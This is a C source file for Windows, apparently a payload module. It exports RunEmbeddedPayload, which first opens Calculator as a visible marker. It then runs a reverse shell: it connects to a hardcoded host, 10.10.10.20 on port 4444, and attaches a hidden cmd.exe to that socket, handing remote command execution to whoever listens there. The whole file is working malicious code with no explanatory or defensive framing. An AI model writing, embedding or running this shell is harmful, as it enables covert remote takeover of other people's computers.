#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>

static const char kCallbackIp[] = "10.10.10.20";
static const unsigned short kCallbackPort = 4444;

static BOOL build_system_path(const char *filename, char path[MAX_PATH])
{
    UINT length = GetSystemDirectoryA(path, MAX_PATH);

    if ((length == 0) || (length >= MAX_PATH)) {
        return FALSE;
    }

    if ((length + 1 + lstrlenA(filename) + 1) > MAX_PATH) {
        return FALSE;
    }

    path[length] = '\\';
    path[length + 1] = '\0';
    lstrcatA(path, filename);
    return TRUE;
}

static BOOL launch_calculator(void)
{
    char calc_path[MAX_PATH] = { 0 };
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!build_system_path("calc.exe", calc_path)) {
        return FALSE;
    }

    if (!CreateProcessA(calc_path, NULL, NULL, NULL, FALSE, 0,
            NULL, NULL, &startup_info, &process_info)) {
        return FALSE;
    }

    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);
    return TRUE;
}

static BOOL run_fixed_reverse_shell(void)
{
    WSADATA winsock_data;
    SOCKET callback_socket = INVALID_SOCKET;
    struct sockaddr_in callback_address;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    char command_path[MAX_PATH] = { 0 };
    BOOL launched = FALSE;

    ZeroMemory(&winsock_data, sizeof(winsock_data));
    ZeroMemory(&callback_address, sizeof(callback_address));
    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));

    if (WSAStartup(MAKEWORD(2, 2), &winsock_data) != 0) {
        return FALSE;
    }

    callback_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (callback_socket == INVALID_SOCKET) {
        goto cleanup;
    }

    callback_address.sin_family = AF_INET;
    callback_address.sin_port = htons(kCallbackPort);
    callback_address.sin_addr.s_addr = inet_addr(kCallbackIp);

    if (connect(callback_socket, (struct sockaddr *)&callback_address,
            sizeof(callback_address)) == SOCKET_ERROR) {
        goto cleanup;
    }

    if (!SetHandleInformation((HANDLE)callback_socket,
            HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        goto cleanup;
    }

    if (!build_system_path("cmd.exe", command_path)) {
        goto cleanup;
    }

    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.hStdInput = (HANDLE)callback_socket;
    startup_info.hStdOutput = (HANDLE)callback_socket;
    startup_info.hStdError = (HANDLE)callback_socket;

    if (!CreateProcessA(command_path, NULL, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info)) {
        goto cleanup;
    }

    launched = TRUE;
    CloseHandle(process_info.hThread);
    WaitForSingleObject(process_info.hProcess, INFINITE);
    CloseHandle(process_info.hProcess);

cleanup:
    if (callback_socket != INVALID_SOCKET) {
        closesocket(callback_socket);
    }
    WSACleanup();
    return launched;
}

#ifdef __cplusplus
extern "C"
#endif
BOOL RunEmbeddedPayload(void)
{
    launch_calculator();
    return run_fixed_reverse_shell();
}
